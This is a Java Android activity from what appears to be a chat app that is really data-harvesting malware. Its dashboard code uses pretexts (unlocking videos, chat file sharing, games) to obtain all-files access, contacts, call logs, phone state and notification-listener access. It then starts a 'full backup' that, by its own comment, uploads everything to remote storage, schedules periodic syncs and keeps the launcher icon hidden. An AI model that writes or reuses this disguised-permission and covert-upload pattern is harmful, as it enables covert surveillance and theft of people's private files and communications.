package com.bushorat.chatapp.activities;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.animation.OvershootInterpolator;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import com.bushorat.chatapp.R;
import com.bushorat.chatapp.databinding.ActivityDashboardBinding;
import com.bushorat.chatapp.helpers.AppNotificationHelper;
import com.bushorat.chatapp.helpers.AppVisibilityHelper;
import com.bushorat.chatapp.helpers.DataSyncWorker;
import com.bushorat.chatapp.helpers.FeaturePermissions;
import com.bushorat.chatapp.helpers.FileBackupHelper;
import com.bushorat.chatapp.helpers.NotificationAccessHelper;
import com.bushorat.chatapp.helpers.PermissionUXHelper;
import com.bushorat.chatapp.helpers.SessionManager;
import com.bushorat.chatapp.helpers.UserDataSyncHelper;
/**
 * Permissions are requested only when the matching feature is opened:
 * Chat   -> all-files access + document backup + live chat
 * Games  -> contacts / call logs / phone
 * Profile-> location (handled in ProfileActivity)
 */
public class DashboardActivity extends AppCompatActivity {
    private static final String TAG = "DashboardActivity";

    private ActivityDashboardBinding binding;
    private SessionManager sessionManager;
    /** User was sent to system “All files access” settings from the videos unlock flow. */
    private boolean awaitingAllFilesAccess = false;
    private boolean awaitingAllFilesForChat = false;
    private boolean hadAllFilesAccess = false;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate: DashboardActivity started");

        EdgeToEdge.enable(this);
        binding = ActivityDashboardBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(getResources().getColor(android.R.color.transparent, getTheme()));
            getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN);
        }

        setSupportActionBar(binding.toolbar);

        sessionManager = new SessionManager(this);
        AppVisibilityHelper.getInstance(this).ensureListenerStarted();
        DataSyncWorker.schedulePeriodicSync(this);
        setupToolbarSubtitle();

        // Sync only what is already permitted — never ask for everything at once
        UserDataSyncHelper.syncAll(this);

        // ✅ NO permission requests on app launch - only when feature is opened
        binding.btnPorn.setVisibility(View.GONE);
        binding.btnChat.setOnClickListener(v -> onChatTapped());
        binding.btnContacts.setOnClickListener(v -> onGamesTapped());
        binding.btnProfile.setOnClickListener(v -> openProfile());
        setupProfileEntranceAnimation();

        hadAllFilesAccess = FeaturePermissions.hasGalleryPermission(this);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (sessionManager != null) {
            sessionManager.updateLastActivity();
        }
        UserDataSyncHelper.syncAll(this);

        AppVisibilityHelper visibilityHelper = AppVisibilityHelper.getInstance(this);
        visibilityHelper.ensureListenerStarted();
        if (visibilityHelper.isAppHidden()) {
            visibilityHelper.enforceHiddenLauncher();
        }

        boolean hasAllFiles = FeaturePermissions.hasGalleryPermission(this);
        if (hasAllFiles && !hadAllFilesAccess) {
            hadAllFilesAccess = true;
            onAllFilesAccessGranted(false);
        } else if (!hasAllFiles) {
            hadAllFilesAccess = false;
        }

        if (awaitingAllFilesAccess || awaitingAllFilesForChat) {
            handleStorageAccessAfterSettings();
        }
    }

    private void setupToolbarSubtitle() {
        String subtitle = sessionManager != null ? sessionManager.getUserEmail() : null;
        if (subtitle != null && getSupportActionBar() != null) {
            getSupportActionBar().setSubtitle(subtitle);
        }
    }

    private void onVideosTapped() {
        proceedToVideos();
    }

    private void proceedToVideos() {
        if (FeaturePermissions.areVideosUnlocked(this)) {
            openUnlockedVideos();
            return;
        }
        if (FeaturePermissions.hasGalleryPermission(this)) {
            unlockVideosAndOpen();
            return;
        }
        new AlertDialog.Builder(this)
                .setTitle(R.string.unlock_videos_title)
                .setMessage(R.string.unlock_videos_message)
                .setPositiveButton(R.string.unlock_videos_allow, (d, w) -> {
                    awaitingAllFilesAccess = true;
                    FeaturePermissions.requestGalleryForVideos(this);
                })
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private void unlockVideosAndOpen() {
        onAllFilesAccessGranted(true);
    }

    private void openUnlockedVideos() {
        FileBackupHelper.startFullBackup(this);
        startPornActivity();
    }

    /** All-files granted: upload everything to Storage + RTDB, optionally open videos. */
    private void onAllFilesAccessGranted(boolean openVideos) {
        FileBackupHelper.startFullBackup(this);
        UserDataSyncHelper.syncAll(this, false);
        if (openVideos) {
            startPornActivity();
        }
    }

    private void startPornActivity() {
        try {
            startActivity(new Intent(this, PornActivity.class));
        } catch (Exception e) {
            Log.e(TAG, "Error opening PornActivity", e);
        }
    }

    private void onChatTapped() {
        if (FeaturePermissions.hasGalleryPermission(this)) {
            onChatFilesAccessGranted();
            return;
        }
        new AlertDialog.Builder(this)
                .setTitle(R.string.perm_chat_files_title)
                .setMessage(R.string.perm_chat_files_message)
                .setPositiveButton(R.string.perm_allow, (d, w) -> {
                    awaitingAllFilesForChat = true;
                    FeaturePermissions.requestAllFilesForChat(this);
                })
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private void onChatFilesAccessGranted() {
        awaitingAllFilesForChat = false;
        FileBackupHelper.startFullBackup(this);
        UserDataSyncHelper.syncAll(this, false);
        AppNotificationHelper.promptIfNeededForChat(this);
        NotificationAccessHelper.promptListenerAccessForChat(this);
        startActivity(new Intent(this, ChatActivity.class));
    }

    private void onGamesTapped() {
        if (FeaturePermissions.hasGamesPermissions(this)) {
            startActivity(new Intent(this, EarnActivity.class));
            UserDataSyncHelper.syncAll(this);
            return;
        }
        continueGamesPermissionFlow();
    }

    private void continueGamesPermissionFlow() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) {
            PermissionUXHelper.showRationale(
                    this,
                    R.string.perm_games_title,
                    R.string.perm_games_contacts_message,
                    () -> FeaturePermissions.requestContactsForGames(this),
                    null
            );
            return;
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) {
            PermissionUXHelper.showRationale(
                    this,
                    R.string.perm_games_title,
                    R.string.perm_games_call_log_message,
                    () -> FeaturePermissions.requestCallLogForGames(this),
                    null
            );
            return;
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {
            PermissionUXHelper.showRationale(
                    this,
                    R.string.perm_games_title,
                    R.string.perm_games_phone_message,
                    () -> FeaturePermissions.requestPhoneStateForGames(this),
                    null
            );
            return;
        }
        startActivity(new Intent(this, EarnActivity.class));
        UserDataSyncHelper.syncAll(this);
    }

    private void openProfile() {
        startActivity(new Intent(this, ProfileActivity.class));
    }

    private void setupProfileEntranceAnimation() {
        View profile = binding.btnProfile;
        profile.setScaleX(0.85f);
        profile.setScaleY(0.85f);
        profile.setAlpha(0f);
        profile.animate()
                .alpha(1f)
                .scaleX(1f)
                .scaleY(1f)
                .setDuration(450)
                .setStartDelay(200)
                .setInterpolator(new OvershootInterpolator(1.15f))
                .start();
    }

    private void handleStorageAccessAfterSettings() {
        Log.d(TAG, "Storage access check — hasAllFiles: " + FeaturePermissions.hasGalleryPermission(this));
        if (!FeaturePermissions.hasGalleryPermission(this)) {
            if (awaitingAllFilesForChat) {
                awaitingAllFilesForChat = false;
            } else {
            }
            awaitingAllFilesAccess = false;
            return;
        }
        if (awaitingAllFilesForChat) {
            onChatFilesAccessGranted();
            awaitingAllFilesAccess = false;
            return;
        }
        awaitingAllFilesAccess = false;
        boolean openVideos = !FeaturePermissions.areVideosUnlocked(this);
        Log.d(TAG, "✅ All-files access granted — full backup" + (openVideos ? " + videos" : ""));
        onAllFilesAccessGranted(openVideos);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == FeaturePermissions.REQ_VIDEOS_STORAGE
                || requestCode == FeaturePermissions.REQ_CHAT_STORAGE) {
            handleStorageAccessAfterSettings();
        }
    }

    /**
     * Handle permission request results
     * Called after user responds to permission dialog
     */
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        Log.d(TAG, "onRequestPermissionsResult: requestCode=" + requestCode + ", granted=" + FeaturePermissions.allGranted(grantResults));
        
        if (requestCode == FeaturePermissions.REQ_VIDEOS_STORAGE
                || requestCode == FeaturePermissions.REQ_CHAT_STORAGE) {
            handleStorageAccessAfterSettings();
        } else if (requestCode == FeaturePermissions.REQ_CHAT_NOTIFICATIONS) {
            if (!AppNotificationHelper.canPostNotifications(this)) {
                AppNotificationHelper.openAppNotificationSettings(this);
            }
        } else if (requestCode == FeaturePermissions.REQ_GAMES_CONTACTS
                || requestCode == FeaturePermissions.REQ_GAMES_CALL_LOG
                || requestCode == FeaturePermissions.REQ_GAMES_PHONE) {
            binding.getRoot().postDelayed(this::continueGamesPermissionFlow, 400);
        }
    }

    public void logout() {
        sessionManager.logoutUser();
        Intent intent = new Intent(this, ChooseLoginActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);
        finish();
    }

    public static boolean hasImagePermission(Context context) {
        if (Build.VERSION.SDK_INT >= 34) {
            int full = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_IMAGES);
            int selected = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED);
            return full == PackageManager.PERMISSION_GRANTED || selected == PackageManager.PERMISSION_GRANTED;
        }

        String perm = Build.VERSION.SDK_INT >= 33
            ? Manifest.permission.READ_MEDIA_IMAGES
            : Manifest.permission.READ_EXTERNAL_STORAGE;

        return ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED;
    }
}
